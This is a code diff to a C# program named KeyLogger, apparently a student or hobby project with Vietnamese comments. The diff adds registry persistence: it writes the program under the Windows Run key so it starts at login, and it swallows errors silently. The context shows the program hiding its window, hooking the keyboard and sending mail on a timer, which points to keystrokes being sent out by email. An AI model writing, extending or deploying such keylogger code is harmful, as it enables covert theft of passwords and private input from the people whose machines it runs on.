@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Microsoft.Win32;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
@@ -249,6 +250,24 @@ namespace KeyLogger
         }
         #endregion
 
+        #region Khởi động cùng windows
+        static void StartWithOS()
+        {
+            RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\Key Logger");
+            RegistryKey regstart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
+            string keyvalue = "1";
+            try
+            {
+                regkey.SetValue("Index", keyvalue);
+                regstart.SetValue("Key Logger", Application.StartupPath + "\\" + Application.ProductName + ".exe");
+                regkey.Close();
+            }
+            catch (System.Exception ex)
+            {
+            }
+        }
+        #endregion
+
         #region Gửi mail
         static int MailTime = 20000;
         static void SendMail()
@@ -306,6 +325,7 @@ namespace KeyLogger
 
         static void Main(string[] args)
         {
+            StartWithOS();
             HideWindow();
             StrartTimer();
             HookKeyboard();
